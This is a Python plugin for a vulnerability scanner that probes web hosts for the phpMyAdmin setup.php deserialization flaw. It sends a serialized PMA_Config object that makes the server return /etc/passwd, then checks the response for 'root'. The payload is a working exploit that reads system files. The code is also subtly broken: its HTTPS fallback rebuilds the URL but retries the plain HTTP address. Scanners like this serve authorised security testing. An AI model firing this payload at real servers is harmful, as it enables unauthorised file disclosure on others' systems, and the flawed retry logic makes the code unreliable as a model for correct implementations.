#!/usr/bin/env python
# -*- coding:utf-8 -*-

class VulnChecker(VulnCheck):
    def __init__(self, ip_and_port_list):
        self._name = 'phpmyadmin_setup_rce'
        self.info = "Check the phpMyAdmin Scripts/setup.php Deserialization Vulnerability"
        self.keyword = ['all', 'phpmyadmin', 'pma', 'rce', 'setup', 'intranet', 'danger', 'web']
        self.default_ports_list = WEB_PORTS_LIST
        VulnCheck.__init__(self, ip_and_port_list)

    def _check(self, ip, port):
        result = "exists phpMyAdmin Scripts/setup.php Deserialization Vulnerability(WooYun-2016-199433)"
        url1 = "http://%s:%d/scripts/setup.php"%(ip, int(port)) if add_web_path == "" else "http://%s:%d/%s/scripts/setup.php"%(ip, int(port), add_web_path)
        url2 = "https://%s:%d/scripts/setup.php"%(ip, int(port)) if add_web_path == "" else "https://%s:%d/%s/scripts/setup.php"%(ip, int(port), add_web_path)
        poc_data = 'action=test&configuration=O:10:"PMA_Config":1:{s:6:"source",s:11:"/etc/passwd";}'
        try:
            req = Requester(url1, method='post', data=poc_data, noencode=True)
            if req.code == 200 and 'root' in req.html and 'Set-Cookie: phpMyAdmin'.lower() in req.headers.lower():
                self._output(ip, port, result)
        except RequesterOpenError:
            try:
                req = Requester(url1, method='post', data=poc_data, noencode=True)
                if req.code == 200 and 'root' in req.html and 'Set-Cookie: phpMyAdmin'.lower() in req.headers.lower():
                    self._output(ip, port, result)
            except:
                pass
        except:
            pass

globals()['VulnChecker'] = VulnChecker